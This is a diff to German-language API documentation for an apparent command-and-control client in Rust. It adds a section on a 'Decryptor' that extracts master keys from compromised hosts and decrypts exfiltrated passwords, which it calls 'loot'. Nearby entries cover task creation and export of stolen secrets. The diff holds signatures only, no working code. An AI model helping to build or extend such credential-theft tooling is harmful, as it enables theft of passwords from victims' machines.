@@ -32,6 +32,12 @@ Die Datenmodelle stammen aus `kx_core::c2` — derselben Quelle der Wahrheit, di
 - [client.rs:Client::create_task] — `pub async fn create_task(&self, req: &CreateTaskRequest) -> Result<String, ApiError>`; HTTP POST auf `{base_url}{PATH_TASKS_CREATE}`, liefert die `id` des angelegten Tasks.
 - [client.rs:export] — `pub fn export(secrets: &[ExfiltratedSecret], path: &Path, format: &str) -> Result<(), ApiError>`; exportiert als JSON oder CSV.
 
+### Entschlüsselung (crate-intern)
+
+- [decrypt.rs:Decryptor] — `pub struct Decryptor` mit privatem Feld `server: ServerKeyPair`; gewinnt aus den Hosts die Master-Keys und entschlüsselt damit die Secrets.
+- [decrypt.rs:Decryptor::load] — `pub fn load(pfad: &Path) -> Result<Self, String>`; liest das `ServerKeyBundle` aus der JSON-Datei.
+- [decrypt.rs:Decryptor::decrypt_all] — `pub fn decrypt_all(&self, hosts: &[Host], secrets: &[ExfiltratedSecret]) -> Vec<ExfiltratedSecret>`; liefert **denselben Typ** wie die Eingabe, mit gefülltem `password` und leerem `sealed_password`. `id` und `collected_at` bleiben erhalten — es gibt keinen zweiten Typ für die entschlüsselte Beute.
+
 ### Transport (aus `kx_core::c2::transport`)
 
 - [kx-core/src/c2/transport.rs:Transport](../../kx-core/src/c2/transport.rs) — `pub struct Transport`; TLS-Client, Basis-URL und Token.
